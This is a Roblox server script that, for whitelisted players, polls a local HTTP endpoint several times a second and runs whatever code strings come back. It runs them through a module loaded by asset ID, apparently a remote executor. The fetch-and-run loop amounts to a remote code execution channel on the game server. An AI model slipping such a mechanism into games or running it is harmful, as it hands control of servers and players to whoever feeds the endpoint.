local https = game:GetService("HttpService")
local plrs = game:GetService("Players")

local endpoint = "http://localhost:5000/"
local run = require(0x26E001F12)

local threads = {}

local whitelist = function(plr)
	return https:JSONDecode(https:GetAsync(endpoint.."api/whitelist?userid="..tostring(plr.UserId)))
end

local function plrAdded(plr)
	if whitelist(plr) then
		threads[tostring(plr.UserId)] = coroutine.create(function()
			while true do
				task.wait(0.3)
				pcall(function()
					local queue = https:JSONDecode(https:GetAsync(endpoint.."api/ping", true, {["user-id"]=tostring(plr.UserId)}))
                    for _, code in pairs(queue) do
				    	coroutine.wrap(function()
                            run(code)
                        end)()
                    end
				end)
			end
		end)
		coroutine.resume(threads[tostring(plr.UserId)])
	end
end
local function plrRemoving(plr)
	print(plr, whitelist(plr))
	if whitelist(plr) then
		pcall(function()
			https:PostAsync(endpoint.."api/close", "", Enum.HttpContentType.TextPlain, false, {["user-id"]=tostring(plr.UserId)})
		end)
		coroutine.close(threads[tostring(plr.UserId)])
	end
end

for _, plr in pairs(plrs:GetPlayers()) do
    plrAdded(plr)
end
plrs.PlayerAdded:Connect(plrAdded)
plrs.PlayerRemoving:Connect(plrRemoving)

game:BindToClose(function()
    for _, plr in pairs(plrs:GetPlayers()) do
        plrRemoving(plr)
    end
	wait(1)
end)